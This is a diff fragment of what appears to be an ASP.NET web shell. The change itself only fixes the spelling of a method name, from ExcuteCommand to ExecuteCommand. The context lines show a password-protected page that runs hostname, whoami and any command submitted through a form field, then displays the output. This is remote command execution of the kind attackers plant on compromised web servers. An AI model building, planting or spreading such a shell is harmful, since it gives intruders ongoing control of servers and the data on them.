@@ -18,7 +18,7 @@
         CommandTextbox.Value = Request.Form["CommandTextbox"];
     }
 
-    string ExcuteCommand(string arg)
+    string ExecuteCommand(string arg)
     {
         if (arg.Length >= 1)
         {
@@ -40,11 +40,11 @@
     {
         if (Request.Form["PasswordTextbox"] == Password) 
         {
-            string h = Server.HtmlEncode(ExcuteCommand("hostname")).Trim();
-            string u = Server.HtmlEncode(ExcuteCommand("whoami")).Trim();
+            string h = Server.HtmlEncode(ExecuteCommand("hostname")).Trim();
+            string u = Server.HtmlEncode(ExecuteCommand("whoami")).Trim();
 
             Hostname.Text = u + "@" + h;
-            CommandOutput.InnerHtml = Server.HtmlEncode(ExcuteCommand(Request.Form["CommandTextbox"]));
+            CommandOutput.InnerHtml = Server.HtmlEncode(ExecuteCommand(Request.Form["CommandTextbox"]));
         }
         else 
         {
